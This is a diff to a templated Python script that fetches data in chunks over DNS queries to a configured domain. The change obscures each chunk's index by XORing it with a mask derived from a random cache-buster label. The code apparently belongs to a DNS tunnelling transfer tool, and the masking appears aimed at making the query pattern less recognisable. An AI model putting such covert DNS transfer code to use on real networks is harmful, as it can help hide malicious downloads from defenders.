@@ -20,6 +20,7 @@ SFB_ARGS = {{SFB_ARGS}}
 
 CACHE_BUSTER_PREFIX = 'r-'
 CACHE_BUSTER_HEX_LEN = 8
+INDEX_HEX_LEN = 8
 
 
 def _cache_buster_label():
@@ -27,12 +28,40 @@ def _cache_buster_label():
     return '%s%08x' % (CACHE_BUSTER_PREFIX, value)
 
 
+def _cache_buster_mask(label):
+    if not label:
+        return None
+    if not label.startswith(CACHE_BUSTER_PREFIX):
+        return None
+    hex_text = label[len(CACHE_BUSTER_PREFIX):]
+    if len(hex_text) != CACHE_BUSTER_HEX_LEN:
+        return None
+    for ch in hex_text:
+        if ch not in '0123456789abcdef':
+            return None
+    try:
+        return int(hex_text, 16)
+    except (TypeError, ValueError):
+        return None
+
+
+def _index_label(label, index):
+    mask = _cache_buster_mask(label)
+    if mask is None:
+        return None
+    value = (index ^ mask) & 0xFFFFFFFF
+    return ('%0' + str(INDEX_HEX_LEN) + 'x') % value
+
+
 def _count_name(label):
     return '%s.count.%s' % (label, BASE_DOMAIN)
 
 
 def _piece_name(label, index):
-    return '%s.%05d.%s' % (label, index, BASE_DOMAIN)
+    token = _index_label(label, index)
+    if not token:
+        return None
+    return '%s.%s.%s' % (label, token, BASE_DOMAIN)
 TIMEOUT = 2.0
 PIPELINE_WINDOW = 8
 PIPELINE_RESEND_AFTER = 0.5
@@ -242,7 +271,10 @@ def _fetch_chunks(resolver, count):
             while len(pending) < window and next_index <= count:
                 index = next_index
                 next_index += 1
-                name = _piece_name(_cache_buster_label(), index)
+                label = _cache_buster_label()
+                name = _piece_name(label, index)
+                if not name:
+                    continue
                 while True:
                     dns_id, packet = _build_query(name)
                     if dns_id not in pending_ids:
